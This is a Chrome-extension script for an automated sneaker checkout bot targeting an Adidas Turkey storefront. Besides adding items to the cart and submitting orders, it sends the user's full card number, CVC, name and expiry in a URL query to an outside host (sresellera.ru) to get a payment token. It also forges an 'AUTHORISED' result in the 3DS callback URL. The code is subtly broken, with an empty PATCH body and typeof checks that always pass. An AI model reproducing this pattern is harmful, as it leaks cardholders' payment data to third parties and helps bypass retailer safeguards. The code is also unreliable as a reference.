async function sendNotification(message){
    iziToast.show({
        title: '[TRM]',
        message: message,
        position: 'topRight',
        color: 'blue'
    });
};
async function sendError(message){
    iziToast.show({
        title: '[TRM]',
        message: message,
        position: 'topRight',
        color: 'red'
    });
};

async function post(path, params, method='post') {
    const form = document.createElement('form');
    form.method = method;
    form.action = path;
    for (const key in params) {
      if (params.hasOwnProperty(key)) {
        const hiddenField = document.createElement('input');
        hiddenField.type = 'hidden';
        hiddenField.name = key;
        hiddenField.value = params[key];
  
        form.appendChild(hiddenField);
      }
    }
  
    document.body.appendChild(form);
    form.submit();
  }
  
adyenLib = document.createElement('script');
adyenLib.type = 'text/javascript';
adyenLib.src = 'https://live.adyen.com/hpp/js/df.js';
document.body.appendChild(adyenLib);
adyenLib.onload = () => {
    let hiddenField = document.createElement('input')
    hiddenField.id = "hiddenAdyenInput"
    hiddenField.type = "hidden"
    let script = document.createElement('script')
    script.innerHTML = 'dfSet("hiddenAdyenInput");'
    document.body.appendChild(hiddenField)
    document.body.appendChild(script)
    script.onload = () => {}
};

siteHostname = window.location.hostname;

chrome.storage.local.get(null, function(storage){
    if (storage.adidas.status){
        const sitepath = window.location.pathname.startsWith('/tr') ? '?sitePath=tr' : '';
        profile = {
            "firstName": storage.profiles[storage.adidas.profile.tr]["name"].split(" ")[1],
            "lastName": storage.profiles[storage.adidas.profile.tr]["name"].split(" ")[0],
            "state": storage.profiles[storage.adidas.profile.tr]["state"],
            "city": storage.profiles[storage.adidas.profile.tr]["city"],
            "address1": storage.profiles[storage.adidas.profile.tr]["address1"],
            "address2": storage.profiles[storage.adidas.profile.tr]["address2"],
            "zip": storage.profiles[storage.adidas.profile.tr]["zip"],
            "phone": storage.profiles[storage.adidas.profile.tr]["phone"].split("(")[1].replaceAll("-","").replace(")",""),
            "email": storage.profiles[storage.adidas.profile.tr]["email"],
            "passport": storage.profiles[storage.adidas.profile.tr]["extra"],
            "cardNumber": storage.profiles[storage.adidas.profile.tr]["cardNumber"],
            "cardName": storage.profiles[storage.adidas.profile.tr]["name"],
            "cardCVC": storage.profiles[storage.adidas.profile.tr]["cardCVC"],
            "cardMonth": storage.profiles[storage.adidas.profile.tr]["cardDate"].split("/")[0],
            "cardYear": "20" + storage.profiles[storage.adidas.profile.tr]["cardDate"].split("/")[1]
        };
        let atcURI = `https://${siteHostname}/api/checkout/baskets/-/items${sitepath}`;
        let atcProducts = [{
            "productId":`${productID}_${storage.adidas.size.var}`,
            "product_id":productID,
            "product_variation_sku":`${productID}_${storage.adidas.size.var}`,
            "quantity":1,
            "specialLaunchProduct":storage.adidas.isSpecial
        }]
        for (let tmp_productID of window.location.hash.substring(1).split("-")){
            if (tmp_productID != ""){
                atcProducts.push({
                    "productId":`${tmp_productID}_${storage.adidas.size.var}`,
                    "product_id":tmp_productID,
                    "product_variation_sku":`${tmp_productID}_${storage.adidas.size.var}`,
                    "quantity":1,
                    "specialLaunchProduct":storage.adidas.isSpecial
                })
            }
        }
        fetch(atcURI, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(atcProducts),
            mode: 'cors',
            credentials: 'include'
        }).then(function (response){
            if (response.status == 200){
                response.json().then(r => {
                    let res = (typeof r["shipmentList"] !== "undefined") ? r["shipmentList"][0]["productLineItemList"] : [];
                    res.push({'productId':'endOfArr'});
                    for (let item of res){
                        if (item["productId"] === `${productID}_${storage.adidas.size.var}`){
                            (async () => {
                                await sendNotification(`Added to cart ${productID} - ${storage.adidas.size.UK}`);
                                if (storage.adidas.aco){
                                    await sendNotification(`Getting shipping rates`);
                                    const response = await fetch(`https://${siteHostname}/api/chk/baskets/${r["basketId"]}/shipping_methods${sitepath}`);
                                    const authToken = response.headers.get('authorization');
                                    const shippings = await response.json();
                                    var patchDetails = {
                                        "customer": {
                                            "email": profile["email"],
                                            "receiveSmsUpdates": false
                                        },
                                        "shippingAddress": {
                                            "type": "HOME",
                                            "firstName": profile["firstName"],
                                            "lastName": profile["lastName"],
                                            "phoneNumber": profile["phone"],
                                            "city": profile["city"],
                                            "stateCode": profile["state"],
                                            "countyProvince": profile["state"],
                                            "zipcode": profile["zip"],
                                            "country": "TR",
                                            "etag": "2021-08-17T06:46:11Z",
                                            "address1": profile["address1"],
                                            "address2": profile["address2"],
                                            "emailAddress": profile["email"]
                                        },
                                        "billingAddress": {
                                            "type": "HOME",
                                            "firstName": profile["firstName"],
                                            "lastName": profile["lastName"],
                                            "phoneNumber": profile["phone"],
                                            "city": profile["city"],
                                            "stateCode": profile["state"],
                                            "countyProvince": profile["state"],
                                            "zipcode": profile["zip"],
                                            "country": "TR",
                                            "etag": "2021-08-17T06:46:11Z",
                                            "address1": profile["address1"],
                                            "address2": profile["address2"],
                                            "emailAddress": profile["email"],
                                            "documentValue": profile["passport"],
                                            "documentTypeId": "Individual"
                                        },
                                        "newsletterSubscription": true,
                                        "consentVersion": "ADI_VER_20200921_TR_EN",
                                        "methodList": [{
                                            "id": shippings[0]["id"],
                                            "shipmentId": shippings[0]["shipmentId"],
                                            "carrierServiceCode": shippings[0]["carrierServiceCode"],
                                        }]
                                    };
                                    if (typeof(shippings[0]["carrierCode"]) !== undefined)
                                        patchDetails["methodList"][0]["carrierCode"] = shippings[0]["carrierCode"];
                                    if (typeof(shippings[0]["shipNode"]) !== undefined)
                                        patchDetails["methodList"][0]["shipNode"] = shippings[0]["shipNode"];
                                    if (typeof(shippings[0]["collection"]) !== undefined)
                                        patchDetails["methodList"][0]["collectionPeriod"] = `${new Date(shippings[0]["collection"]["from"]).toISOString()},${new Date(shippings[0]["collection"]["to"]).toISOString()}`;
                                    if (typeof(shippings[0]["delivery"]) !== undefined)
                                        patchDetails["methodList"][0]["deliveryPeriod"] = `${new Date(shippings[0]["delivery"]["from"]).toISOString()},${new Date(shippings[0]["delivery"]["to"]).toISOString()}`;
                                    await sendNotification(`Posting shipping details`);
                                    await fetch(`https://${siteHostname}/api/chk/baskets/${r["basketId"]}${sitepath}`, {
                                        method: 'PATCH',
                                        body: JSON.stringify(),
                                        headers: {
                                            'checkout-authorization': authToken,
                                            'content-type': 'application/json'
                                        }
                                    });
                                    await sendNotification(`Getting adyen`);
                                    const responseAdyen = await fetch('https://sresellera.ru/2.0/adyen?' + new URLSearchParams({
                                        cardNumber : profile["cardNumber"],
                                        cvc : profile["cardCVC"],
                                        holderName : profile["cardName"],
                                        expiryMonth : profile["cardMonth"],
                                        expiryYear : profile["cardYear"],
                                    }), {method: 'POST', mode: 'cors'});
                                    const adyenToken = await responseAdyen.json();
                                    document.querySelector('input#hiddenAdyenInput').value;
                                    const fingerprint = document.querySelector('input#hiddenAdyenInput').value;
                                    await sendNotification(`Checking out`);
                                    const sendCheckoutResponse = await fetch(`https://${siteHostname}/api/chk/orders${sitepath}`, {
                                        method: 'POST',
                                        headers: {
                                            'checkout-authorization': authToken,
                                            'content-type': 'application/json'
                                        },
                                        body: JSON.stringify({
                                            "basketId": r["basketId"],
                                            "encryptedInstrument": adyenToken,
                                            "paymentInstrument": {
                                                "holder": profile["cardName"],
                                                "expirationMonth": parseInt(profile["cardMonth"]),
                                                "expirationYear": parseInt(profile["cardYear"]),
                                                "lastFour": profile["cardNumber"].substr(profile["cardNumber"].length - 4),
                                                "paymentMethodId": "CREDIT_CARD",
                                                "cardType": "VISA"
                                            },
                                            "fingerprint": fingerprint
                                        })
                                    }).then(r => r.json());
                                    if (typeof sendCheckoutResponse["paRedirectForm"] !== "undefined"){
                                        let checkoutTimestamp = (new Date()).toJSON().split('T')[1].slice(0, -1);
                                        await chrome.runtime.sendMessage({message: "publicSuccess", site: siteHostname, item: productID, size: storage.adidas.size.UK, time: checkoutTimestamp}, function(response){});
                                        await chrome.runtime.sendMessage({message: "privateSuccess", status:'Successfully checked out!', site: siteHostname, item: productID, size: storage.adidas.size.UK, profile: storage.adidas.profile.tr, orderId: `${sendCheckoutResponse["orderId"]}`, image: item["productImage"]}, function(response){});
                                        await sendNotification(`Opening 3DS`);
                                        await post(sendCheckoutResponse["paRedirectForm"]["formAction"], {
                                            'PaReq': sendCheckoutResponse["paRedirectForm"]["formFields"]["PaReq"],
                                            'MD': sendCheckoutResponse["paRedirectForm"]["formFields"]["MD"],
                                            'TermUrl': `https://${siteHostname}/en/payment/callback/CREDIT_CARD/${r["basketId"]}/adyen?orderId=${sendCheckoutResponse["orderId"]}&encodedData=${sendCheckoutResponse["paRedirectForm"]["formFields"]["EncodedData"]}&result=AUTHORISED`
                                        }, method='post');
                                    } else if (sendCheckoutResponse["status"] === "new"){
                                        let checkoutTimestamp = (new Date()).toJSON().split('T')[1].slice(0, -1);
                                        await chrome.runtime.sendMessage({message: "publicSuccess", site: siteHostname, item: productID, size: storage.adidas.size.UK, time: checkoutTimestamp}, function(response){});
                                        await chrome.runtime.sendMessage({message: "privateSuccess", status:'Successfully checked out!', site: siteHostname, item: productID, size: storage.adidas.size.UK, profile: storage.adidas.profile.tr, orderId: `${sendCheckoutResponse["orderId"]}`, image: item["productImage"]}, function(response){});
                                        await sendNotification(`Successfully checked out (No 3DS)`);
                                    } else {
                                        await sendError(`Failed to check out`);
                                    }
                                }
                            })()
                            break
                        } else if (item["productId"] === "endOfArr"){
                            sendError(`Failed to cart ${productID} - ${storage.adidas.size.UK}`)
                        };
                    };
                });
            };
        });
    };
});
